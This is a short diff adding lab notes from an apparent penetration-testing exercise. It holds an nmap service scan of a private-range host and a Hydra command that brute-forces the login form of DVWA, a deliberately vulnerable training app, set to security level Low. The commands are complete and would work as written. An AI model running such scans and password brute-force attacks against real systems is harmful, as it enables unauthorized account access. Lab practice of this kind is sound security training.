@@ -1,0 +1,12 @@
+# HTTP service enumeration
+nmap -p 80 -sV 192.168.56.101
+
+# Note:
+# Medusa is not ideal for complex web forms.
+# For educational purposes, Hydra was used to simulate
+# automated login attempts against DVWA.
+
+# HTTP POST brute force attack against DVWA login form
+# DVWA Security Level: Low
+hydra -l admin -P ../wordlists/passwords.txt 192.168.56.101 http-post-form \
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
